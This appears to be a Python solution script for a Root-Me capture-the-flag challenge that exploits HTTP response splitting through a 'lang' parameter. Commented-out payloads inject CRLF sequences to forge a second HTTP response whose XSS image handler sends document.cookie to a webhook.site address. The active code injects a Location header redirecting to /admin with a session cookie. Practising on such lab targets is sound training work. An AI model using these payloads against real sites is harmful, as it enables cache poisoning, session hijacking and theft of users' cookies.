# import requests
# headers = {'Pragma': 'no-cache'}
# data = {'user_session':'f73ac6d9-2a70-476b-a9f0-aec82a1d5ea5','lang':'en'}
# payload='''%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLocation:%20/admin%20%0d%0aLast-Modified:%20Mon,%2027%20Oct%202025%2014:50:18%20GMT%0d%0aContent-Length:%20120%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><img src=x onerror=this.src='https://webhook.site/5c570631-54ae-486f-ba41-819eb5a4928d?c='%2Bdocument.cookie></html>'''
# payload1='''foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Shazam</html>'''
# payload2=''''''
# payload3='''%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLocation:%20/home%20%0d%0aLast-Modified:%20Mon,%2027%20Oct%202025%2014:50:18%20GMT%0d%0aContent-Length:%20127%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><img%20src=x%20onerror=this.src='https://webhook.site/5c570631-54ae-486f-ba41-819eb5a4928d?c='%2Bdocument.cookie></html>'''
# r = requests.get('http://challenge01.root-me.org:58002/home', data = {'lang':'en'})
# print r.text
# q = requests.get('http://challenge01.root-me.org:58002/user/param?lang=en{}'.format(payload2), data = data)
# # print q.text
# f = requests.get('http://challenge01.root-me.org:58002/home', data = data)
# print f.text
import requests

page = "http://challenge01.root-me.org:58002/user/param?lang=fr%0D%0ALocation:http://challenge01.root-me.org:58002/admin%0A%0DHTTP/1.1%20200%20OK%0D%0AContent-Type:text/html%0D%0Alang=fr"
cook = {'spip_session' : 'ce2fa369-116b-4b8c-ba7a-e1e435d4cd07'}
res = requests.get(page,cookies=cook)
print (res.text)
